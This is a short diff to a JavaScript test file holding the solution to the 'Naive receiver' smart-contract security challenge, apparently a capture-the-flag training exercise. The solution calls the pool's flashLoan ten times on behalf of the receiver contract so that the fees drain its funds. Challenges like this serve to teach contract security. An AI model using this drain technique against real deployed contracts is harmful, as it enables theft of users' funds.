@@ -40,9 +40,9 @@ describe('[Challenge] Naive receiver', function () {
         /** CODE YOUR SOLUTION HERE */
         // We take a flashloan using that receiver, and drain all the funds
         // because the fee is really expensive.
-        this.pool = await this.pool.connect(attacker);
+        pool = await pool.connect(player);
         for (let i = 0; i < 10; i++) {
-            await this.pool.flashLoan(this.receiver.address, 1);
+            await pool.flashLoan(receiver.address, await pool.ETH(), 1, 0);
         }
     });
 
